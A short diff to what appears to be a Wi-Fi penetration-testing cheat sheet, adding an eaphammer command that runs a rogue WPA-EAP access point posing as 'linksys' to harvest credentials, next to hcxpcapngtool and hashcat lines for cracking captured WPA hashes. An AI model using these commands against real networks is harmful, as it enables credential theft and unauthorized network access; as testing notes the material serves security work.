@@ -90,6 +90,10 @@ hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
 hashcat -m 22000 hash.hc22000 /usr/share/john/password.lst
 ```
 
+#### eaphammer - alternative
+```text
+sudo eaphammer -i wlan0mon --channel 4 --auth wpa-eap --wpa-version 2 --essid linksys --creds
+```
 
 
 https://wiki.gentoo.org/wiki/Hostapd
